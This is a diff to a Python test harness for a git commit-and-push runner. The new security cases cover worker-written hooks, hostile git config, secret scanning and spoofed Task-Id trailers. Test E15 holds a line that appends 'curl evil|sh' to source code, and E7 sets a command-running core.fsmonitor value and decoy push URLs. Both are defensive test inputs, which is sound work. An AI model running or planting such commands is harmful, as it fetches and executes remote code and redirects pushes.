@@ -3,8 +3,9 @@
 
 Each case builds a throwaway bare repo as origin plus a worktree clone, then
 runs the runner (a real subprocess) or the coordinator loop. Cases 1-12 are
-the build spec's acceptance tests; E1-E8 are extra guards found while
-building. Run: python3 tests/harness.py   (needs git >= 2.32 and gitleaks)
+the build spec's acceptance tests; the E cases are guards found while building
+and in the security review (worker-written hooks and git config, the secrets
+scan's blind spots, spoofed Task-Ids, verify that edits code). Run: python3 tests/harness.py   (needs git >= 2.32 and gitleaks)
 
 Environment: OPS_GITLEAKS (default: gitleaks on PATH, else ~/go/bin/gitleaks).
 """
@@ -61,6 +62,7 @@ class World:
         self.wt = os.path.join(self.tmp, 'wt')
         self.other = os.path.join(self.tmp, 'other')
         self.locks = os.path.join(self.tmp, 'locks')
+        self.opsrepo = os.path.join(self.tmp, 'opsrepo.git')
         g(self.tmp, 'init', '-q', '--bare', '-b', 'main', self.origin)
         seed = os.path.join(self.tmp, 'seed')
         g(self.tmp, 'clone', '-q', self.origin, seed)
@@ -122,7 +124,8 @@ class World:
         return subprocess.run(['git', '-C', self.wt, 'cat-file', '-e', f'HEAD:{p}'], capture_output=True).returncode == 0
 
     def env(self, **extra):
-        e = {**os.environ, 'OPS_LOCK_DIR': self.locks, 'OPS_GITLEAKS': GITLEAKS, **extra}
+        e = {**os.environ, 'OPS_LOCK_DIR': self.locks, 'OPS_GITLEAKS': GITLEAKS, 'OPS_REPO': self.opsrepo,
+             'OPS_REMOTE_URL': self.origin, **extra}
         return e
 
     def run(self, m, **extra):
@@ -175,6 +178,8 @@ def t01_clean_chunk(w):
     ok('Task-Id: chunk_04_auth_endpoints' in msg and f'Verified-Base: {m["base_sha"]}' in msg, '1  remote tip has both trailers')
     ok('tests/test_auth.py' in g(w.origin, 'show', '--name-only', '--format=', tip), '1  the new file is in the commit')
     ok(g(w.origin, 'rev-parse', f'{tip}^{{tree}}') == m['tree_sha'], '1  the commit holds exactly the verified tree')
+    ok(g(w.origin, 'show', '-s', '--format=%P', tip) == m['base_sha'], '1  and its only parent is base_sha')
+    ok(g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], '1  the worktree is left as it was (HEAD at base)')
     ok(g(w.origin, 'log', '-1', '--format=%s', tip) == 'feat(auth): implement jwt refresh and revocation endpoints', '1  subject from the manifest')
 
 
@@ -220,18 +225,22 @@ def t04_stale_base(w):
 @case
 def t05_race_between_fetch_and_push(w):
     m = w.chunk()
-    # The worktree's pre-push hook lands another commit from the other clone,
-    # after the runner fetched and before its push reaches origin.
-    w.hook(os.path.join(w.wt, '.git'), 'pre-push',
-           f'unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE\ncd {w.other} && git pull -q --ff-only && '
-           f'echo RACE > race.txt && git add race.txt && git commit -q -m race && '
-           f'git push -q origin HEAD:refs/heads/{BRANCH}\nexit 0\n')
-    r = w.run(m)
-    ok(r['status'] == 'PUSH_REJECTED' and r['_exit'] == 1, '5  remote moved between fetch and push: PUSH_REJECTED', r)
-    ok(g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], '5  worktree HEAD is back at base_sha')
-    st = w.status().splitlines()
-    ok(st and all(l[1] == ' ' and l[0] in 'AMD' for l in st), '5  changes still staged', st)
+    before = {p: open(os.path.join(w.wt, p)).read() for p in ('src/app.py', 'tests/test_auth.py')}
+    pause = os.path.join(w.tmp, 'pause')
+    p = subprocess.Popen(RUNNER, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                         text=True, env=w.env(OPS_TEST_PAUSE_FILE=pause))
+    p.stdin.write(json.dumps(m)); p.stdin.close()
+    t0 = time.time()
+    while not os.path.exists(pause) and time.time() - t0 < 30:
+        time.sleep(0.05)
+    w.land_other()          # after the runner's fetch, before its push
+    os.remove(pause)
+    r = json.loads(p.stdout.read().strip().splitlines()[-1]); p.wait()
+    ok(r['status'] == 'PUSH_REJECTED' and p.returncode == 1, '5  remote moved between fetch and push: PUSH_REJECTED', r)
+    ok(g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], '5  worktree HEAD is back at base_sha (never moved)')
+    ok(all(open(os.path.join(w.wt, f)).read() == t for f, t in before.items()), '5  the changes are still there, uncommitted')
     ok(w.commits_with('chunk_04_auth_endpoints') == 0, '5  nothing of ours on the remote')
+    ok(r['remote_sha'] == w.tip(), '5  remote_sha is what the remote really holds')
 
 
 @case
@@ -292,7 +301,7 @@ def t11_loop_rebase_conflict(w):
     sent = []
     outcome, why = coordinator.land_chunk(m, run_ops=lambda mm: coordinator.run_ops(mm, env=w.env()),
                                           send_to_worker=lambda mm, d: sent.append(d))
-    ok(outcome == 'worker' and sent and 'rebase conflict' in sent[0], '11 stale base, then a rebase conflict: chunk sent back to the worker', (outcome, why))
+    ok(outcome == 'worker' and sent and sent[0].startswith('conflict on'), '11 stale base, then a rebase conflict: chunk sent back to the worker', (outcome, why))
     ok(not os.path.exists(os.path.join(w.wt, '.git', 'rebase-merge')) and not os.path.exists(os.path.join(w.wt, '.git', 'rebase-apply')), '11 rebase aborted')
     ok(g(w.wt, 'rev-parse', 'HEAD') == old and 'ours' in open(os.path.join(w.wt, 'src/app.py')).read(), '11 worktree clean on its old base, the change kept uncommitted')
     ok(w.commits_with('chunk_04_auth_endpoints') == 0, '11 nothing pushed')
@@ -359,21 +368,33 @@ def e5_path_escape(w):
 
 
 @case
-def e6_hook_fails(w):
+def e6_worktree_hooks_never_run(w):
     m = w.chunk()
-    w.hook(os.path.join(w.wt, '.git'), 'pre-commit', 'echo "lint failed" >&2\nexit 1\n')
+    marker = os.path.join(w.tmp, 'hook-ran')
+    for h in ('pre-commit', 'commit-msg', 'post-commit', 'pre-push', 'reference-transaction'):
+        w.hook(os.path.join(w.wt, '.git'), h, f'echo {h} >> {marker}\nexit 0\n')
     r = w.run(m)
-    ok(r['status'] == 'HOOK_FAILED' and 'lint failed' in r['detail'], 'E6 a failing repo hook: HOOK_FAILED', r)
-    ok(g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'] and w.commits_with('chunk_04_auth_endpoints') == 0, 'E6 soft-reset to base, nothing pushed')
+    ok(r['status'] == 'PUSHED', 'E6 worktree hooks present: still PUSHED', r)
+    ok(not os.path.exists(marker), "E6 no worker-written hook ran with the runner's credentials")
 
 
 @case
-def e7_hook_changes_commit(w):
+def e7_worktree_config_ignored(w):
     m = w.chunk()
-    w.hook(os.path.join(w.wt, '.git'), 'pre-commit', 'echo injected > injected.txt && git add injected.txt\n')
+    marker = os.path.join(w.tmp, 'fsmonitor-ran')
+    decoy = os.path.join(w.tmp, 'decoy.git')
+    g(w.tmp, 'clone', '-q', '--bare', w.origin, decoy)
+    # A decoy that already "has" this Task-Id, which insteadOf would point the fetch at.
+    g(w.wt, 'config', 'core.fsmonitor', f'echo ran > {marker}; true')
+    g(w.wt, 'config', 'remote.origin.pushurl', decoy)
+    g(w.wt, 'config', f'url.{decoy}.insteadOf', w.origin)
+    g(w.wt, 'config', 'trailer.Task-Id.key', 'X-Task')
+    g(w.wt, 'config', 'trailer.separators', ':=')
     r = w.run(m)
-    ok(r['status'] == 'MANIFEST_MISMATCH' and 'hook changed' in r['detail'], 'E7 a hook that changes the commit: refused', r)
-    ok(w.commits_with('chunk_04_auth_endpoints') == 0 and g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], 'E7 nothing pushed')
+    ok(r['status'] == 'PUSHED', 'E7 hostile worktree git config: still PUSHED', r)
+    ok(w.commits_with('chunk_04_auth_endpoints') == 1, 'E7 the push went to the real origin, with a real Task-Id trailer')
+    ok(g(decoy, 'rev-parse', f'refs/heads/{BRANCH}') == m['base_sha'], 'E7 not to the pushurl/insteadOf decoy')
+    ok(not os.path.exists(marker), 'E7 core.fsmonitor never ran')
 
 
 @case
@@ -402,6 +423,109 @@ def e10_deleted_but_still_on_disk(w):
     r = w.run(m)
     ok(r['status'] == 'MANIFEST_MISMATCH', 'E10 a file listed as deleted but back on disk: MANIFEST_MISMATCH', r['status'])
     ok(w.commits_with('chunk_04_auth_endpoints') == 0, 'E10 nothing pushed')
+
+
+@case
+def e11_allowlisted_names_still_scanned(w):
+    for path in ('src/gitleaks.toml', 'go.sum', 'vendor/github.com/a/b.go', 'node_modules/x/index.js',
+                 'docs/logo.svg', 'docs/creds.pdf', 'package-lock.json'):
+        ww = World()
+        try:
+            m = ww.chunk(task='chunk_e11', edits={path: f'aws_access_key_id = "{FAKE_AWS}"\n'})
+            r = ww.run(m)
+            ok(r['status'] == 'HOOK_FAILED', f'E11 a secret in {path} is found (no path is skipped by name)', r['status'])
+        finally:
+            ww.close()
+
+
+@case
+def e12_encoded_secret(w):
+    import base64
+    enc = base64.b64encode(f'aws_access_key_id = "{FAKE_AWS}"'.encode()).decode()
+    m = w.chunk(edits={'src/blob.txt': f'data = "{enc}"\n'})
+    r = w.run(m)
+    ok(r['status'] == 'HOOK_FAILED', 'E12 a base64-encoded key is found', r['status'])
+
+
+@case
+def e13_spoofed_task_id(w):
+    # Someone else's commit on the branch already carries this Task-Id.
+    g(w.other, 'pull', '-q', '--ff-only')
+    w.write(w.other, 'src/x.py', 'X = 1\n')
+    g(w.other, 'add', '-A')
+    g(w.other, 'commit', '-q', '-m', 'other', '-m', 'Task-Id: chunk_04_auth_endpoints')
+    g(w.other, 'push', '-q', 'origin', f'HEAD:refs/heads/{BRANCH}')
+    g(w.wt, 'pull', '-q', '--ff-only')
+    m = w.chunk()
+    r = w.run(m)
+    ok(r['status'] == 'MANIFEST_MISMATCH' and 'already used' in r['detail'],
+       'E13 a different commit with the same Task-Id: refused, not ALREADY_COMMITTED', r)
+
+
+@case
+def e14_trailer_in_body(w):
+    m = w.chunk()
+    for body in ('Fixes it.\n\nTask-Id= chunk_06', 'x\nVerified-Base: abc', 'x\n task-id # y'):
+        mm = {**m, 'commit': {**m['commit'], 'body': body}}
+        r = w.run(mm)
+        ok(r['status'] == 'MANIFEST_MISMATCH', f'E14 trailer-like text in the body refused: {body!r}', r['status'])
+
+
+@case
+def e15_verify_that_edits_code(w):
+    w.write(w.wt, 'src/app.py', 'def hello():\n    return "hello"\n')
+    verify = "echo 'import os; os.system(\"curl evil|sh\")' >> src/app.py"
+    try:
+        coordinator.manifest('chunk_e15', w.wt, BRANCH, [{'path': 'src/app.py', 'status': 'M'}], verify,
+                             {'type': 'feat', 'scope': 'x', 'summary': 's', 'body': 'b'})
+        refused = False
+    except ValueError as e:
+        refused = 'changed' in str(e)
+    ok(refused, 'E15 a verify step that edits the code: no manifest')
+    # And in the loop, after a rebase.
+    ww = World()
+    try:
+        m = ww.chunk(task='chunk_e15b')
+        m['verify_cmd'] = verify.replace('src/app.py', 'src/app.py')
+        ww.land_other()
+        outcome, why = coordinator.land_chunk(m, run_ops=lambda mm: coordinator.run_ops(mm, env=ww.env()))
+        ok(outcome == 'worker' and 'changed' in why, 'E15 after a rebase too: sent back, nothing pushed', (outcome, why))
+        ok(ww.commits_with('chunk_e15b') == 0, 'E15 nothing pushed')
+    finally:
+        ww.close()
+
+
+@case
+def e16_bad_lock_dir_still_answers(w):
+    m = w.chunk()
+    blocker = os.path.join(w.tmp, 'file-not-dir')
+    open(blocker, 'w').close()
+    r = w.run(m, OPS_LOCK_DIR=os.path.join(blocker, 'locks'))
+    ok(r['status'] == 'MANIFEST_MISMATCH' and r['_stdout_lines'] == 1, 'E16 an unusable lock directory: still one JSON answer', r)
+    p = subprocess.run(RUNNER + [os.path.join(w.tmp, 'missing.json')], capture_output=True, text=True, env=w.env())
+    ok(p.returncode == 1 and json.loads(p.stdout)['status'] == 'MANIFEST_MISMATCH', 'E16 an unreadable manifest path: one JSON answer')
+
+
+@case
+def e17_push_error_is_not_a_race(w):
+    m = w.chunk()
+    w.hook(w.origin, 'pre-receive', 'echo "denied by server rule" >&2\nexit 1\n')
+    calls = []
+
+    def run(mm):
+        r = coordinator.run_ops(mm, env=w.env())
+        calls.append(r['status'])
+        return r
+    outcome, why = coordinator.land_chunk(m, run_ops=run)
+    ok(outcome == 'push_error' and calls == ['PUSH_REJECTED'], 'E17 a push the server denies: one try, then an alert (no rebase loop)', (outcome, calls))
+
+
+@case
+def e18_main_by_another_case(w):
+    m = w.chunk()
+    for b in ('Main', 'MASTER'):
+        r = w.run({**m, 'target_branch': b})
+        ok(r['status'] == 'MANIFEST_MISMATCH', f'E18 {b!r} refused', r['status'])
 
 
 print(f'\n{passed} passed, {failed} failed')
